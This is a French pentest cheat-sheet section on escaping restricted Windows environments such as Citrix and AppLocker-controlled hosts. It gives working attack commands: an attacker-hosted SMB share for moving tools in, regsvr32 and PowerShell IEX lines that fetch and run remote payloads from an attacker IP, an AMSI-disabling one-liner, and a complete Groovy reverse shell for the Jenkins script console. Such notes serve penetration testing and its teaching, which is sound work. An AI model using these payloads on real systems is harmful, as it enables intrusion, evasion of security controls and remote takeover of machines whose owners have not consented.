# 07-Évasion des Environnements Restreints

Cette section aborde les techniques pour s'échapper ou exécuter du code dans des environnements Windows restreints tels que Citrix, les sessions RDP limitées, ou lorsque AppLocker est en place.

## Évasion de Citrix et Environnements Similaires (Dialog Box Abuse)

La méthodologie de base pour s'échapper d'un environnement de type application publiée (Citrix, etc.) est :
1.  Obtenir l'accès à une `Boîte de Dialogue` système (Ouvrir, Enregistrer sous, Imprimer, etc.).
2.  Exploiter la boîte de dialogue pour obtenir une `exécution de commandes` ou un accès au système de fichiers.
3.  `Élever les privilèges` si nécessaire.

**Exemple avec MS Paint (ou Notepad, Wordpad, etc.) :**
1.  Si une application comme `Paint` est disponible, lancez-la.
2.  Allez dans `Fichier > Ouvrir` (ou `Ctrl+O`).
3.  Dans la boîte de dialogue "Ouvrir" :
    *   Dans le champ "Nom de fichier", vous pouvez souvent taper des chemins locaux ou UNC.
    *   Pour accéder au système de fichiers local : `C:\Windows\System32\` puis Entrée. Vous pouvez alors naviguer.
    *   Pour exécuter une commande (si possible) : tapez `cmd.exe` ou `powershell.exe` et Entrée.
    *   Pour accéder à un partage UNC : `\\127.0.0.1\c$\Utilisateurs\VotreUtilisateur` (pour accéder à votre profil local) ou `\\<IP_SERVEUR_SMB>\partage`.
    *   Changez "Type de fichiers" en "Tous les fichiers (\*.\*)" pour voir tous les fichiers.

**Accéder à un Partage SMB depuis un Environnement Restreint :**
1.  Démarrez un serveur SMB sur votre machine attaquante (ex: avec Impacket `smbserver.py`) :
    ```shell-session
    # Sur la machine attaquante (Kali)
    sudo python3 /usr/share/impacket/examples/smbserver.py -smb2support MonPartage /chemin/vers/vos/outils
    # Ou smbserver.py MonPartage . (pour partager le répertoire courant)
    ```
2.  Dans l'environnement restreint (ex: Citrix via Paint) :
    *   Ouvrez la boîte de dialogue `Fichier > Ouvrir`.
    *   Dans "Nom de fichier", tapez : `\\<IP_ATTAQUANT>\MonPartage`
    *   Appuyez sur Entrée. Vous devriez pouvoir voir et copier des fichiers depuis/vers le partage.
    *   Copiez vos outils (nc.exe, winPEAS, etc.) vers un emplacement accessible dans l'environnement restreint (ex: `C:\Users\Public\Downloads` ou un répertoire temporaire).

## Contournement d'AppLocker
AppLocker restreint les applications, scripts et installeurs que les utilisateurs peuvent exécuter.

**1. Énumération de la Politique AppLocker**
```powershell
# Obtenir la politique effective (appliquée)
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Effective | Format-List *

# Tester si un exécutable spécifique est bloqué pour l'utilisateur "Everyone"
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
# Test-AppLockerPolicy -Path C:\chemin\vers\votre\payload.exe -User (whoami)
```
Analysez les règles pour identifier les chemins autorisés (writeable et executable), les types de fichiers autorisés, et les éditeurs de confiance.

**2. Techniques de Contournement Courantes**
*   **Utilisation de binaires Windows signés et autorisés (Living Off The Land Binaries - LOLBAS) :**
    De nombreux exécutables Windows peuvent être utilisés pour exécuter du code, télécharger des fichiers, etc. Voir https://lolbas-project.github.io/
    *   **Regsvr32 :** Peut exécuter des scripts SCT distants.
        ```powershell
        # payload.sct hébergé sur http://<IP_ATTAQUANT>/payload.sct
        regsvr32.exe /s /u /i:http://<IP_ATTAQUANT>/payload.sct scrobj.dll
        ```
    *   **MSBuild :** Peut compiler et exécuter du code C# à partir d'un fichier projet XML.
        ```powershell
        # C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\chemin\vers\payload.csproj
        ```
    *   **InstallUtil :** Peut exécuter du code dans des assemblys .NET (méthode Uninstall).
        ```powershell
        # C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\chemin\vers\payload.exe
        ```
    *   **CMSTP :** Peut exécuter des scripts SCT à partir de fichiers INF.
    *   **PowerShell Constrained Language Mode Bypass :** Si PowerShell est restreint, des techniques existent pour le contourner.

*   **Chemins Inscriptibles et Exécutables :** Si vous trouvez un répertoire où vous pouvez écrire des fichiers ET depuis lequel l'exécution est autorisée par AppLocker, placez-y votre payload.

*   **DLL Hijacking sur des Applications Autorisées :** Si une application autorisée charge une DLL depuis un emplacement contrôlable.

## Contournement des Restrictions PowerShell
Si PowerShell est en mode `Constrained Language Mode` ou si l'exécution de scripts est bloquée.

**1. Vérifier le Mode de Langage PowerShell**
```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage : Pas de restrictions
# ConstrainedLanguage : Fortement limité
# RestrictedLanguage : Très limité
```

**2. Techniques de Contournement**
*   **Exécution de code PowerShell à distance (si IEX et IWR sont autorisés) :**
    ```powershell
    # IEX (Invoke-Expression) avec IWR (Invoke-WebRequest)
    IEX(New-Object Net.WebClient).DownloadString('http://<IP_ATTAQUANT>/rev.ps1')
    # Ou
    # IEX(IWR http://<IP_ATTAQUANT>/rev.ps1 -UseBasicParsing)
    ```

*   **Contournement d'AMSI (Antimalware Scan Interface) :**
    AMSI peut bloquer les scripts PowerShell malveillants. Des techniques de bypass existent.
    ```powershell
    # Un exemple de bypass AMSI (peut être obsolète, de nombreuses variantes existent)
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    # Ou utiliser des outils/scripts dédiés comme Amsi-Bypass de RastaMouse
    ```

*   **Utiliser des runspaces PowerShell depuis C# :**
    Si vous pouvez exécuter du code .NET (par exemple via MSBuild, InstallUtil), vous pouvez créer un runspace PowerShell qui n'est pas soumis aux mêmes restrictions.

*   **PowerShell sans powershell.exe :**
    Utiliser des outils comme `PowerLessShell` ou `NoPowerShell` qui exécutent du code PowerShell via le framework .NET sans lancer `powershell.exe`.

## Exploitation des Interfaces Restreintes (Exemple : Console de Script Jenkins)
Certaines applications web ou outils d'administration (comme Jenkins) peuvent fournir des consoles de script (Groovy, Python, etc.) qui s'exécutent sur le serveur avec les privilèges du service de l'application.

**Exemple (Console de script Jenkins - Groovy) pour un reverse shell :**
(Code tiré de `03-other-stuff-not-finished.md`)
```groovy
// Payload pour un reverse shell via la console de script Jenkins
String host="<IP_ATTAQUANT>";
int port=<PORT_ATTAQUANT>;
String cmd="cmd.exe"; // ou powershell.exe
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try {
    p.exitValue();
    break;
  }catch (Exception e){
    // Processus toujours en cours
  }
};
p.destroy();
s.close();
```
Collez ce code dans la console de script Jenkins (Manage Jenkins > Script Console) après avoir remplacé `<IP_ATTAQUANT>` et `<PORT_ATTAQUANT>`.
Si Jenkins s'exécute en tant que SYSTEM ou un utilisateur privilégié, le shell sera privilégié. 